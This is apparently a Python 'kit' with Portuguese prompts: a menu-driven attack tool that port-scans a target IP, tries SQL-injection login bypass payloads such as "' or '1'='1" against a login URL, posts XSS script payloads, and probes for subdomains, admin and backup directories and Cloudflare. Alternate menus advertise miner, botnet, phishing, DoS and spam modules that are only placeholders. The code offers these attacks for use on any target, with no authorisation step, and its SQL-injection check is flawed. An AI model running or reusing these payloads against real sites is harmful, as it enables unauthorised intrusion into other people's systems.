import socket,os,time,sys,requests
from datetime import datetime
os.system("clear")
c = "\033[1;90m"
v = "\033[91m"
z = "\033[0;0m"
print('''\033[91m

 #######   ####    #####   ######   ######
  ##   #  ##  ##  ##   ##   ##  ##   ##  ##
  ##     ##       ##        ##  ##   ##  ##
  ####   ##       ## ####   #####    #####
  ##     ##       ##   ##   ##       ##  ##
  ##      ##  ##  ##   ##   ##       ##  ##
 ####      ####    #####   ####     ######

\033[0;0m''')
print('''\033[1;90m


kkkkkkkk             iiii           tttt
k::::::k            i::::i       ttt:::t
k::::::k             iiii        t:::::t
k::::::k                         t:::::t
 k:::::k    kkkkkkkiiiiiii ttttttt:::::ttttttt
 k:::::k   k:::::k i:::::i t:::::::::::::::::t
 k:::::k  k:::::k   i::::i t:::::::::::::::::t
 k:::::k k:::::k    i::::i tttttt:::::::tttttt
 k::::::k:::::k     i::::i       t:::::t
 k:::::::::::k      i::::i       t:::::t
 k:::::::::::k      i::::i       t:::::t
 k::::::k:::::k     i::::i       t:::::t    tttttt
k::::::k k:::::k   i::::::i      t::::::tttt:::::t
k::::::k  k:::::k  i::::::i      tt::::::::::::::t
k::::::k   k:::::k i::::::i        tt:::::::::::tt
kkkkkkkk    kkkkkkkiiiiiiii          ttttttttttt
\033[0;0m''')

print("""\033[1;96m
____________________
┃       MENU       ┃
┃ 1 - scan tcp     ┃
┃ 2 - scan domínio ┃
┃ 3 - sqli scan    ┃
┃ 4 - xss scan     ┃
┃ 5 - subdominios  ┃
┃ 6 - diretórios   ┃
┃ 7 - cloudflare   ┃
┃ 8 - cms scan     ┃
┃ c  - clear       ┃
┃ xx - sair        ┃
┃__________________┃

\033[0;0m""")
while True:
  mn = input("\033[1mdigite a opcao desejada:\033[0;0m ")
  if mn == "1":
    print('''\033[91m

 #
### ### ###      ## ###  ## ##
 #  #   # #      #  #   # # # #
 ## ### ###     ##  ### ### # #
        #
                   
\033[0;0m''')
    ip = input("digite o ip/domínio do alvo: ")
    def scanner_no_ip(endereco_ip, exibir_portas_fechadas=0):
      print(f'Scaneando no IP \033[1;102m{endereco_ip}\033[0;0m')
      print('\033[46mescaneando portas abertas:\033[0;0m')
      portas = [20, 21, 22, 23, 42, 43, 43, 69, 80, 109, 110, 115, 118, 143,
              156, 220, 389, 443, 465, 513, 514, 530, 547, 587, 636, 873,
              989, 990, 992, 993, 995, 1433, 1521, 2049, 2081, 2083, 2086,
              3306, 3389, 5432, 5500, 5800]
      try:
        for porta in portas:
          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          sock.settimeout(0.3)
          result = sock.connect_ex((endereco_ip, porta))
          if result == 0:
            print(f' \033[42;1;33m{porta}\033[0;0m \033[42mesta aberta\033[0;0m')
          else:
            if exibir_portas_fechadas == 0:
              print(f' \033[42;1;41m{porta}\033[0;0m \033[1;41mesta fechada\033[0;0m')
          sock.close()
      except KeyboardInterrupt:
        print('Você saiu do script')
        sys.exit()

      except socket.gaierror:
        print('o host não foi encontrado.')
        sys.exit()

      except socket.error:
        print('Não foi possível conectar no servidor')
        sys.exit()

    if __name__ == '__main__':
      ip_do_servidor = socket.gethostbyname(ip)
      t1 = datetime.now()

      scanner_no_ip(ip_do_servidor)
      t2 = datetime.now()
      total = t2 - t1
      print(f'\033[93mScaneamento finalizado em:\033[0;0m {total} \033[34msegundos\033[0;0m' )
  elif mn == "2":
    dm = input ("\033[1;105mdigite o endereco do alvo: \033[0;0m")
    try:
      ip = socket.gethostbyname(dm)
      print(f' \033[42;1;33m{dm}\033[0;0m \033[42mexiste este domínio é esta acessivel\033[0;0m')
    except socket.gaierror:
      print(f' \033[42;1;41m{dm}\033[0;0m \033[1;41meste dominio nao existe\033[0;0m')
  elif mn == "3":
    print("obs: envie a url com o diretório de login, exemplo: www.exemplo.com/login.php")
    iu = input ("digite o site do alvo: ")
    url = iu # URL do formulário de login
    data = {'username': 'admin', 'password': ''} # Dados a serem enviados no formulário
    payloads = ["' or '1'='1", "' or '1'='1'-- ", "' or '1'='1'#", "' or '1'='1'/*"]
    for payload in payloads:
      data['password'] = payload
      response = requests.post(url, data=data)
      if "Login successful" in response.text:
        print("[+] vulnerabilidade de SQL injection encontrado em: " + payload)
      else:
        print(f"{v}este site não está vulnerável{z}")
        break
  elif mn == "4":
    xss = input ("digite a url do alvo: ")
    url = xss # URL da página de busca
    payloads = ['<script>alert("XSS");</script>', '<img src="javascript:alert(\'XSS\');" />']
    for payload in payloads:
      data = {'search': payload}
      response = requests.post(url, data=data)
      if payload in response.text:
        print("[+] XSS vulnerability found with payload: " + payload)
      else:
        print(f"{v}este site não está vulnerável{z}")

  elif mn == "5":
    dm = input("digite a url do alvo: ")
    domain = dm # Domínio a ser escaneado
    subdomains = ['www', 'blog', 'shop', 'admin'] # Lista de subdomínios a serem testados
    for subdomain in subdomains:
      url = f'http://{subdomain}.{domain}'
      try:
        response = requests.get(url)
        if response.status_code < 400:
          print(f'[+] Subdominio existe: {url}')
      except requests.exceptions.ConnectionError:
          pass
  elif mn == "6":
    mv = input("digite a url do alvo: ")
    url = mv # URL do site a ser escaneado
    directories = ['admin', 'backup', 'config', 'uploads'] # Lista de diretórios a serem testados
    for directory in directories:
      try:
        response = requests.get(url + directory)
        if response.status_code < 400:
          print(f'[+] Diretorio existe:  {url}{directory}/')
      except requests.exceptions.ConnectionError:
          pass
  elif mn == "7":
    alv = input("digite a url do alvo: ")
    url = alv
    response = requests.get(url)
    if 'Server' in response.headers and 'cloudflare' in response.headers['Server']:
      print(f'[+] {url} é protegido pelo cloudflare')
    else:
      print(f'[-] {url} não é protegido pelo cloudflare')

  elif mn == "8":
    print("cms")
  elif mn == "9":
    print("spam")
  elif mn == "10":
    print("subsearch")
  elif mn == "m":
    print("""\033[1;35m
____________________
┃       MENU       ┃
┃ 1 - scantcp      ┃
┃ 2 - scan domínio ┃
┃ 3 - dhcminer     ┃
┃ 4 - dhcbotnet    ┃
┃ 5 - sqldhc       ┃
┃ 6 - dhcphisher   ┃
┃ 7 - dhcosint     ┃
┃ 8 - dhcdos       ┃
┃ 9 - dhcspam      ┃
┃ 10 - subsearch   ┃
┃ c  - clear       ┃
┃ xx - sair        ┃
┃__________________┃

\033[0;0m""")
  elif mn == "c":
    os.system("clear")
    print('''\033[91m

 #######   ####    #####   ######   ######
  ##   #  ##  ##  ##   ##   ##  ##   ##  ##
  ##     ##       ##        ##  ##   ##  ##
  ####   ##       ## ####   #####    #####
  ##     ##       ##   ##   ##       ##  ##
  ##      ##  ##  ##   ##   ##       ##  ##
 ####      ####    #####   ####     ######

\033[0;0m''')
    print("""\033[1;44m
____________________
┃       MENU       ┃
┃ 1 - scantcp      ┃
┃ 2 - scan domínio ┃
┃ 3 - dhcminer     ┃
┃ 4 - dhcbotnet    ┃
┃ 5 - sqldhc       ┃
┃ 6 - dhcphisher   ┃
┃ 8 - dhcosint     ┃
┃ 9 - dhcdos       ┃
┃ 10 - dhcspam     ┃
┃ 11 - subsearch   ┃
┃ c  - clear       ┃
┃ xx - sair        ┃
┃__________________┃

\033[0;0m""")
  elif mn == "xx":
    print("saindo...")
    time.sleep(1)
    break 
    
  else:
      print(f' \033[1;100m opcao invalida digite\033[0;0m \033[1;36m m \033[0;0m \033[1;100m para ver o menu de opcoes\033[0;0m ')